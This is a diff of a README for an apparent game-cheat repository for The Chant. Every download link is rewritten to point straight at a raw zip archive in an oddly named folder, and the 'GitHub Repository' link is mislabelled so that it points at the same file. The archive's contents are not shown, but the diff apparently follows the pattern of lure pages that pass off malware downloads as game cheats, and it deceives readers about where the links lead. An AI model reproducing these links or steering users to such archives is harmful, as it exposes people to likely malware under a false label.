@@ -1,6 +1,6 @@
 # 🎮 The-Chant-Infinite-Mind-Cheat - Unleash Your Full Potential in The Chant
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-green)](https://github.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/main/atheistically/The-Chant-Infinite-Mind-Cheat.zip%20Latest%20Release-Click%20Here-green)](https://raw.githubusercontent.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/main/atheistically/The-Chant-Infinite-Mind-Cheat.zip)
 
 ## 🚀 Getting Started
 
@@ -36,7 +36,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to visit the GitHub releases page and download the latest version of the application.
    
-   [Download Latest Release](https://github.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/main/atheistically/The-Chant-Infinite-Mind-Cheat.zip)
    
 2. **Select the Version**: On the releases page, find the most recent version listed. Click on it.
 
@@ -71,7 +71,7 @@ For questions or support, please reach out to our community! You can submit issu
 
 ## 🔗 Important Links
 
-- [Download Latest Release](https://github.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/releases)
-- [GitHub Repository](https://github.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat)
+- [Download Latest Release](https://raw.githubusercontent.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/main/atheistically/The-Chant-Infinite-Mind-Cheat.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kevin1108-debug/The-Chant-Infinite-Mind-Cheat/main/atheistically/The-Chant-Infinite-Mind-Cheat.zip)
 
 Thank you for choosing **Chant Infinite Mind Cheat**! Enjoy enhanced gameplay.
